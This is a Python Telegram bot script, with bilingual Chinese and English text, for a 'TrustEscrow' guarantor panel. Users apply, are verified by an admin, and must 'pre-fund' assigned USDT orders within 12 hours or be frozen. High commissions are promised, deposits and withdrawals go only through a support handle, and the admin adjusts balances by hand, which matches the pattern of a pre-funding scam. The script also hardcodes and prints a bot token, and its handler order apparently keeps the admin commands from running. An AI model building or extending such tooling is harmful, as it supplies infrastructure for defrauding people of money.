# -*- coding: utf-8 -*-
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
import random

# ===================== 配置（已填入你的新Token）=====================
BOT_TOKEN = "8747559514:AAE_N9M9CallB4rYV0lbyny_0tGJnz3hLYU"
ADMIN_ID = 8401979801
bot = telebot.TeleBot(BOT_TOKEN)

# ===================== 數據存儲 =====================
guarantor = {}       # 担保人資料 {id: {status, balance, commission, inviter, banned, name}}
orders = {}         # 訂單 {code: {type, amount, buyer, seller, deadline, status, guar, commission}}
user_lang = {}
step = {}

# ===================== 雙語高級文案 =====================
TEXT = {
    "zh": {
        "home": """🤝 TrustEscrow 中間人專區

【已認證中間人專屬後台】
實時接單｜墊資結算｜傭金秒結

📊 傭金規則：
🔹 搶單利潤：固定 5%
🔹 派單利潤：15%~25%（按訂單金額浮動）

⚠️ 平台規則：
● 派單強制接單，不可拒絕
● 派單需 12 小時內完成墊資
● 逾期未處理將凍結帳號
● 違規操作永久封鎖

安全 · 專業 · 長期穩定""",

        "not_verified": """⚠️ 您尚未成為認證中間人

請申請入驻並等待管理員審核。
需填寫：真實資料 + 推薦人ID""",

        "banned": """❌ 您的帳號已被管理員凍結
請聯繫客服：@fcff88""",

        "apply": """📝 申請成為中間人
請輸入您的：真實姓名/暱稱""",

        "apply_inviter": """📎 請輸入推薦人ID
無推薦人請輸入：0""",

        "apply_sent": """✅ 申請已提交成功
請等待管理員審核結果，審核通過後將通知您""",

        "balance": """👤 個人中心
ID：{}
姓名：{}
狀態：{}
可用餘額：{:.2f} USDT
累計傭金：{:.2f} USDT
推薦人：{}""",

        "deposit": """💰 儲值入口
僅透過官方客服處理，保障資金安全。
➡️ 客服專線：@fcff88

儲值流程：
1. 聯繫客服並提供您的用戶ID
2. 選擇儲值金額與支付方式
3. 完成付款並提交截圖
4. 資金即時到帳，可立即使用

⚠️ 僅官方客服處理，其他渠道皆為詐騙""",

        "withdraw": """💳 提現入口
提現僅透過官方客服審核處理。
➡️ 客服專線：@fcff88

提現流程：
1. 聯繫客服並提供用戶ID
2. 告知提現金額與收款方式
3. 等待管理員審核
4. 審核通過立即發放款項

⚠️ 帳號需通過安全驗證，禁止代提""",

        "grab_orders": """🚀 搶單大廳（利潤5%）
{}

點擊按鈕搶單，先搶先得，搶完即止""",

        "no_grab": "📭 暫無可搶訂單",

        "my_orders": """📋 我的訂單
{}""",

        "no_my_orders": "📭 暫無進行中訂單",

        "order_detail": """📥 訂單詳情
類型：{}
金額：{} USDT
傭金：{} USDT
買方：{}
賣方：{}
狀態：{}
截止時間：{}

⚠️ 請按時完成墊資，逾期將凍結帳號""",

        "fund_btn": "✅ 確認已墊資",
        "funded": "✅ 已確認墊資，等待結算",
        "back": "🏠 返回首頁",
        "lang": "🌐 English",
    },
    "en": {
        "home": """🤝 TrustEscrow Guarantor Panel

【Verified Guarantors Only】
Real-time Orders · Fast Commission

📊 Commission Rules:
🔹 Grab Order Profit: 5% Fixed
🔹 Assign Order Profit: 15%~25%

⚠️ Platform Rules:
● Assigned orders CANNOT be refused
● Must fund within 12 hours
● Violation = Account Ban
● Fraud = Permanent Ban

Safe · Professional · Stable""",

        "not_verified": """⚠️ Not verified yet
Please apply and wait for admin approval.""",

        "banned": """❌ Your account is banned
Contact support: @fcff88""",

        "apply": """📝 Apply to be Guarantor
Enter your real name/nickname:""",

        "apply_inviter": """📎 Enter inviter ID (enter 0 if none):""",

        "apply_sent": """✅ Application submitted
Waiting for admin approval.""",

        "balance": """👤 Profile
ID: {}
Name: {}
Status: {}
Balance: {:.2f} USDT
Total Commission: {:.2f} USDT
Inviter: {}""",

        "deposit": """💰 Deposit
Only via official support: @fcff88""",

        "withdraw": """💳 Withdraw
Only via official support: @fcff88""",

        "grab_orders": """🚀 Grab Orders (5% Profit)
{}

Click to grab, first come first served""",

        "no_grab": "📭 No orders available",

        "my_orders": """📋 My Orders
{}""",

        "no_my_orders": "📭 No active orders",

        "order_detail": """📥 Order Details
Type: {}
Amount: {} USDT
Commission: {} USDT
Buyer: {}
Seller: {}
Status: {}
Deadline: {}""",

        "fund_btn": "✅ Confirm Funded",
        "funded": "✅ Confirmed, waiting settlement",
        "back": "🏠 Home",
        "lang": "🌐 繁中",
    }
}

# ===================== 菜單生成 =====================
def main_menu(u):
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("🚀 搶單大廳", callback_data="grab"),
        InlineKeyboardButton("📋 我的訂單", callback_data="my"),
        InlineKeyboardButton("👤 個人中心", callback_data="bal"),
        InlineKeyboardButton("💰 儲值", callback_data="dep"),
        InlineKeyboardButton("💳 提現", callback_data="wdr"),
        InlineKeyboardButton(t["lang"], callback_data="lang"),
    )
    return m

def back(u):
    t = TEXT[user_lang.get(u, "zh")]
    return InlineKeyboardMarkup().add(InlineKeyboardButton(t["back"], callback_data="home"))

def fund_btn(code):
    return InlineKeyboardMarkup().add(InlineKeyboardButton("✅ 確認已墊資", callback_data=f"fd_{code}"))

# ===================== 啟動指令 =====================
@bot.message_handler(commands=['start'])
def start(msg):
    u = msg.from_user.id
    user_lang.setdefault(u, "zh")
    step[u] = None
    guarantor.setdefault(u, {
        "status": "none",    # none, applied, verified
        "balance": 0.0,
        "commission": 0.0,
        "inviter": 0,
        "banned": False,
        "name": "未設置"
    })
    t = TEXT[user_lang[u]]
    g = guarantor[u]
    if g["banned"]:
        bot.send_message(msg.chat.id, t["banned"])
        return
    if g["status"] != "verified":
        bot.send_message(msg.chat.id, t["not_verified"], reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("📝 申請入驻", callback_data="apply")
        ))
        return
    bot.send_message(msg.chat.id, t["home"], reply_markup=main_menu(u))

# ===================== 按鈕回調 =====================
@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    u = c.from_user.id
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    g = guarantor.get(u, {})
    mid = c.message.message_id
    cid = c.message.chat.id
    data = c.data

    try:
        if data == "home":
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif data == "lang":
            user_lang[u] = "en" if lang == "zh" else "zh"
            bot.edit_message_text(TEXT[user_lang[u]]["home"], cid, mid, reply_markup=main_menu(u))

        elif data == "apply":
            step[u] = "apply_name"
            bot.edit_message_text(t["apply"], cid, mid, reply_markup=back(u))

        elif data == "bal":
            s = "✅ 已認證" if g["status"] == "verified" else "⚠️ 未認證"
            txt = t["balance"].format(u, g["name"], s, g["balance"], g["commission"], g["inviter"])
            bot.edit_message_text(txt, cid, mid, reply_markup=back(u))

        elif data == "dep":
            bot.edit_message_text(t["deposit"], cid, mid, reply_markup=back(u))
        elif data == "wdr":
            bot.edit_message_text(t["withdraw"], cid, mid, reply_markup=back(u))

        elif data == "grab":
            lst = [o for o in orders if orders[o]["type"] == "grab" and orders[o]["status"] == "open"]
            if not lst:
                bot.edit_message_text(t["grab_orders"].format(t["no_grab"]), cid, mid, reply_markup=back(u))
                return
            txt = "\n".join([f"• {o} {orders[o]['amount']} USDT" for o in lst[:6]])
            m = InlineKeyboardMarkup(row_width=2)
            for o in lst[:6]:
                m.add(InlineKeyboardButton(f"搶 {o}", callback_data=f"g_{o}"))
            bot.edit_message_text(t["grab_orders"].format(txt), cid, mid, reply_markup=m)

        elif data.startswith("g_"):
            code = data[2:]
            if code not in orders or orders[code]["status"] != "open":
                bot.answer_callback_query(c.id, "❌ 訂單已被搶走")
                return
            o = orders[code]
            o["status"] = "progress"
            o["guar"] = u
            amt = o["amount"]
            com = amt * 0.05
            o["commission"] = com
            bot.answer_callback_query(c.id, "✅ 搶單成功！")
            bot.send_message(u, t["order_detail"].format("搶單", amt, com, o.get("buyer","-"), o.get("seller","-"), "處理中", o["deadline"]), reply_markup=fund_btn(code))

        elif data.startswith("fd_"):
            code = data[3:]
            if code not in orders:
                return
            o = orders[code]
            if o.get("guar") != u:
                return
            o["status"] = "funded"
            bot.edit_message_text(t["funded"], cid, mid, reply_markup=back(u))
            bot.send_message(ADMIN_ID, f"🔔 中間人{u} 已墊資訂單 {code}，金額 {o['amount']} USDT")

        bot.answer_callback_query(c.id)
    except Exception as e:
        print(f"按鈕錯誤: {e}")

# ===================== 用戶輸入處理 =====================
@bot.message_handler(func=lambda m: True)
def msg(msg):
    u = msg.from_user.id
    txt = msg.text.strip()
    if u not in step:
        step[u] = None

    # 申請流程：姓名
    if step[u] == "apply_name":
        step[u] = f"apply_inviter|{txt}"
        bot.send_message(u, TEXT[user_lang[u]]["apply_inviter"])
        return

    # 申請流程：推薦人
    elif str(step[u]).startswith("apply_inviter|"):
        name = step[u].split("|")[1]
        inv = txt
        try:
            inv_id = int(inv)
        except:
            inv_id = 0
        guarantor[u]["status"] = "applied"
        guarantor[u]["inviter"] = inv_id
        guarantor[u]["name"] = name
        bot.send_message(u, TEXT[user_lang[u]]["apply_sent"])
        bot.send_message(ADMIN_ID, f"🆕 新入驻申請\nID: {u}\n名稱: {name}\n推薦人: {inv_id}")
        step[u] = None
        return

# ===================== 管理員專用指令 =====================
@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID)
def admin(msg):
    t = msg.text.split()
    try:
        # 1. 通過認證 /verify ID
        if t[0] == "/verify":
            uid = int(t[1])
            guarantor[uid]["status"] = "verified"
            bot.send_message(uid, "✅ 您已成為認證中間人，歡迎使用！")
            bot.send_message(msg.chat.id, f"✅ 已通過用戶 {uid} 的入驻申請")

        # 2. 封鎖帳號 /ban ID
        elif t[0] == "/ban":
            uid = int(t[1])
            guarantor[uid]["banned"] = True
            bot.send_message(uid, "❌ 您的帳號已被管理員凍結")
            bot.send_message(msg.chat.id, f"✅ 已封鎖用戶 {uid}")

        # 3. 解封帳號 /unban ID
        elif t[0] == "/unban":
            uid = int(t[1])
            guarantor[uid]["banned"] = False
            bot.send_message(uid, "✅ 您的帳號已被管理員解封")
            bot.send_message(msg.chat.id, f"✅ 已解封用戶 {uid}")

        # 4. 增加餘額 /add ID 金額
        elif t[0] == "/add":
            uid = int(t[1])
            amt = float(t[2])
            guarantor[uid]["balance"] += amt
            bot.send_message(uid, f"✅ 您的帳號已增加 {amt} USDT")
            bot.send_message(msg.chat.id, f"✅ 已給用戶 {uid} 增加 {amt} USDT")

        # 5. 扣除餘額 /reduce ID 金額
        elif t[0] == "/reduce":
            uid = int(t[1])
            amt = float(t[2])
            guarantor[uid]["balance"] -= amt
            bot.send_message(uid, f"❌ 您的帳號已扣除 {amt} USDT")
            bot.send_message(msg.chat.id, f"✅ 已給用戶 {uid} 扣除 {amt} USDT")

        # 6. 派單（不可拒絕，12小時限時）/assign 訂單號 金額 買方ID 賣方ID 中間人ID
        elif t[0] == "/assign":
            code = t[1]
            amt = float(t[2])
            buyer = t[3]
            seller = t[4]
            gid = int(t[5])
            # 隨機15%-25%傭金
            com_rate = random.choice([0.15, 0.18, 0.20, 0.22, 0.25])
            com = amt * com_rate
            deadline = (datetime.now() + timedelta(hours=12)).strftime("%m-%d %H:%M (GMT+8)")
            orders[code] = {
                "type": "assign",
                "amount": amt,
                "buyer": buyer,
                "seller": seller,
                "guar": gid,
                "status": "progress",
                "deadline": deadline,
                "commission": com
            }
            # 強制發送給中間人，不可拒絕
            bot.send_message(gid, TEXT[user_lang.get(gid, "zh")]["order_detail"].format("派單", amt, com, buyer, seller, "處理中", deadline), reply_markup=fund_btn(code))
            bot.send_message(msg.chat.id, f"✅ 已派單 {code} 給中間人 {gid}，傭金 {com:.2f} USDT")

        # 7. 創建搶單（≤50USDT，偶爾60/100）/grab 訂單號 金額
        elif t[0] == "/grab":
            code = t[1]
            amt = float(t[2])
            orders[code] = {
                "type": "grab",
                "amount": amt,
                "status": "open",
                "deadline": "-",
                "buyer": "-",
                "seller": "-"
            }
            bot.send_message(msg.chat.id, f"✅ 已創建搶單 {code}，金額 {amt} USDT")

        else:
            bot.send_message(msg.chat.id, "❌ 未知指令，請檢查格式")

    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ 指令格式錯誤，錯誤信息: {e}")

# ===================== 啟動機器人 =====================
if __name__ == "__main__":
    print("✅ 中間人端機器人啟動成功！")
    print(f"🤖 機器人: @MyEscrowBot88bot")
    print(f"🔑 Token: {BOT_TOKEN}")
    bot.infinity_polling()
